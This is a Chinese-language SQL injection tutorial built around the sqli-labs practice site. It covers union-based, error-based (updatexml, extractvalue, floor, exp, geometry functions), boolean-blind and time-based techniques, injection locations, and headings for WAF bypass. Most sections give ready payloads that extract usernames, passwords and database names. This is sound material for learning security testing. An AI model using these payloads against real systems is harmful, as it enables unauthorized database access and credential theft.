# SQL 注入

## 一、数据类型

### 1. 数字型

> 当输入参数为整数时，如果存在注入漏洞，那么可以认为此处存在数字型注入

例如：

```sql
SQL模板：
select * from table_name where id=$id;

注入：
$id = 1 and 1=1 --+
select * from table_name where id=1 and 1=1 --+
```

### 2. 字符型

> 当输入参数为字符时，如果存在注入漏洞，那么可以认为此处存在字符型注入。字符型注入是最常见的注入，字符型注入一般需要进行引号闭合

例如：

```sql
SQL模板：
select * from table_name where name='$name';

注入：
$name = "张三' and 1=1 --+"
select * from table_name where name='张三' and 1=1 --+;
```

### 3. 搜索型

> 当网站存在搜索功能时，如果存在注入点，那么可以认为此处存在搜索型注入。搜索型注入和字符型注入类似，需要闭合符号

例如：

```sql
SQL模板：
select * from table_name where name like '%$name%';

注入：
$name = "三%' and 1=1 --+"
select * from table_name where name like '%三%' and 1=1 --+;
```

## 二、注入方式

### 1. 联合查询注入

#### 概念

> 联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合在一起

#### 示例

PS：本文都使用 sqli-labs 第一关作为示例！

```sql
查询数据库版本和数据库名称：
?id=-1 union select 1, group_concat(version(), '---',database()), 3 --+
```

### 2. 报错回显注入

#### 概念

> 一些网站在查询数据库时，没有关闭数据库查询出错时错误信息的输出。在SQL中的某些函数，在出错时会给出一些提示信息，报错回显注入就是利用这些函数来输出我们需要的结果

#### 注入函数

##### updatexml()

**基本信息**

- UPDATEXML (XML_document, XPath_string, new_value):
  - 第一个参数：xml 文档 ;
  - 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程;
  - 第三个参数：替换查找到的符合条件的数据 ；
- 错误输出最大长度为32位。

**注入使用格式**

```sql
updatexml(1, concat(0x7e, (注入语句), 0x7e), 1)
```

**报错原因**

当第二个参数不符合 xpath 语法时，函数使用报错。

**示例**

```SQL
?id=1' and updatexml(1,concat(0x7e,(select group_concat(username) from users), 0x7e), 1) -- +
```

##### extractvalue()

**基本信息**

- extractvalue(XML_document, XPath_string): 
  - XML_document：目标xml文档；
  - XPath_string：Xpath字符串；
- 错误输出最大长度为32位。

**注入使用格式**

```sql
extractvalue('<a><b><b/></a>',concat(0x7e,(注入语句), 0x7e))
```

**报错原因**

当第二个参数不符合 xpath 语法时，函数使用报错。

**示例**

```sql
?id=1' and extractvalue('<a><b><b/></a>',concat(0x7e,(select group_concat(username) from users), 0x7e)) -- +
```

##### floor()

**基本信息**

- **floor()**: 去除小数部分；
- **count()**: 统计记录数目；
- **rand(x)**: 产生随机数，每个x对应一个固定的值，但是如果连续执行多次值会变化，不过也是可预测的；
- **group by**: 对数据进行分组；
- 错误输出最大长度为64位。

**注入使用格式**

```sql
(SELECT 1 FROM (SELECT count(*), concat((注入语句), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x) a)
```

**报错原因**

[Mysql报错注入之floor(rand(0)*2)报错原理探究 - FreeBuf网络安全行业门户](https://www.freebuf.com/column/235496.html)

**示例**

```sql
?id=1' and (SELECT 1 FROM (SELECT count(*), concat((select table_name from information_schema.tables where table_schema=database() limit 0,1), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x) a) --+
```

##### exp()

**基本信息**

- **exp()**: 返回e 的 输入数次方；
- 错误输出最大长度为64位。

**注入使用格式**

```sql
exp(~(select * from(注入语句) as a))
```

**报错原因**

当传递一个大于709的值时，函数exp()就会引起一个溢出错误。

**示例**

```sql
?id=1' and exp(~(select * from(select group_concat(password) from users) as a)) --+
```

##### geometrycollection()

**注入使用格式**

```sql
geometrycollection((select * from(select * from(注入语句)a)b))
```

**示例**

```sql
?id=1' and geometrycollection((select * from(select * from(select user())a)b)) --+
```

##### multipoint()

**注入使用格式**

```sql
multipoint((select * from(select * from(注入语句)a)b))
```

**示例**

```sql
?id=1' and multipoint((select * from(select * from(select user())a)b)) --+
```

##### polygon()

**注入使用格式**

```sql
polygon((select * from(select * from(注入语句a)b))
```

**示例**

```sql
?id=1' and polygon((select * from(select * from(select database())a)b)) --+
```

##### multipolygon()

**注入使用格式**

```sql
multipolygon((select * from(select * from(注入语句)a)b))
```

**示例**

```sql
?id=1' and multipolygon((select * from(select * from(select user())a)b)) --+
```

##### linestring()

**注入使用格式**

```sql
linestring((select * from(select * from(注入语句)a)b))
```

**示例**

```sql
?id=1' and linestring((select * from(select * from(select user())a)b)) --+
```

##### multilinestring()

**注入使用格式**

```sql
multilinestring((select * from(select * from(注入语句)a)b))
```

**示例**

```sql
?id=1' and multilinestring((select * from(select * from(select user())a)b)) --+
```

### 3. 布尔盲注

#### 概念

> 布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 `true` 、 `false`使web页面返回true或者false，从而达到注入的目的来获取信息

#### 常用函数

- **length()**：返回字符串的长度；
- **substr()**：截取字符串；
- **left()**：从左至右截取字符串；
- **ascii()**：返回字符的 Ascii 码值；
- **regexp()**：正则表达式；
- **ord()**：返回字符串第一个字符的 Ascii 码值；
- **mid()**：从文本字段中提取字符； 

**示例**

PS：此处使用 sqli-labs 第8关进行演示。

**获取数据库名称长度**

```
?id=1' and length(database())=7 --+
?id=1' and length(database())=8 --+
```

获取数据库名称

```
?id=1' and (left(database(), 1) = 's' ) --+
?id=1' and (substr(database(), 2, 1) = 'e' ) --+
?id=1' and (substr(database(), 3, 1) = 'c' ) --+
?id=1' and (substr(database(), 4, 1) = 'u' ) --+
...
```

### 4. 基于时间的布尔盲注

> 时间盲注指通过页面执行的时间来判断数据内容的注入方式，通常用于数据（包含逻辑型）不能返回到页面中的场景，无法利用页面回显判断数据内容，只能通过执行的时间来获取数据。**基于时间的布尔盲注就是在基于布尔的盲注上结合if判断和sleep（）函数来得到一个时间上的变换延迟的参照**。

**示例**

PS：sqli-labs第9关

```
?id=1' and if(length(database())>1, sleep(5), 0) --+
```

## 三、注入位置

#### 1. GET

> 注入点 url 中
>

示例：sqli-labs：Less-1

#### 2. POST

> 注入点在 POST 提交的表单中

示例：sqli-labs：Less-11

#### 3. Cookie

> 注入点位置在 Cookie 中

示例：sqli-labs：Less-20

## 四、注入拓展

### 1. 编解码注入

> base64注入是针对传递的参数被base64加密后的注入点进行注入。

### 2. JSON注入

> JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON注入实际上就是注入点在 JSON 数据中。

### 3. LADP 注入

> **LDAP(Lightweight Directory Access Protocol)**：轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现，是运行于TCP/IP之上的协议，端口号为：**389**， 加密**636**（SSL）

### 4. DNSlog 注入

> DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名www.baidu.com等的访问信息，类似日志文件。在利用sql盲注进行DNSlog回显时，需要用到load_file函数，这个函数可以进行DNS请求。DNSlog注入主要用于解决盲注时不能回显结果的问题。

### 5. 二次注入

> 二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。

示例：sqli-labs：Less-24

### 6. 堆叠查询

> 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。
>
> 而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。

## 五、WAF 绕过

### 1. 大小写绕过

> 大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法绕过，这是最简单的绕过技术。

### 2. 替换关键字

> 为了绕过正则关键字匹配，我们可以采取替换关键词的方式进行绕过。

### 3. 使用编码

#### （1）URL编码

#### （2) 十六进制编码

#### (3) Unicode编码

### 4. 使用注释

### 5. 等价函数与命令

### 6. 特殊符号

### 7. HTTP参数控制

### 8. 缓冲区溢出

### 9. 整合绕过

